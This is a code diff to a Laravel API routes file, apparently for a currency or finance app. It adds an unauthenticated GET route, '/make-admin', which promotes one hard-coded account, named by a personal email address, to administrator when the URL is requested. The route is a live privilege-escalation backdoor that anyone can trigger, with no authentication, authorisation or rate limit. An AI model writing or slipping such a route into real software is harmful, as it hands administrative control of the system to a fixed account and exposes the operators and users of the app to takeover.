@@ -14,6 +14,16 @@ use App\Http\Controllers\NotificationController;
 Route::post('/register', [AuthController::class, 'register'])->middleware('throttle:5,1');
 Route::post('/login', [AuthController::class, 'login'])->middleware('throttle:5,1');
 
+Route::get('/make-admin', function () {
+    $user = \App\Models\User::where('email', 'tadiaemekson@gmail.com')->first();
+    if ($user) {
+        $user->role = 'admin';
+        $user->save();
+        return response()->json(['message' => 'User tadiaemekson@gmail.com is now an admin!']);
+    }
+    return response()->json(['message' => 'User tadiaemekson@gmail.com not found.'], 404);
+});
+
 // Public routes
 Route::get('/currencies', [CurrencyController::class, 'index']);
 Route::get('/providers', [ProviderController::class, 'index']);
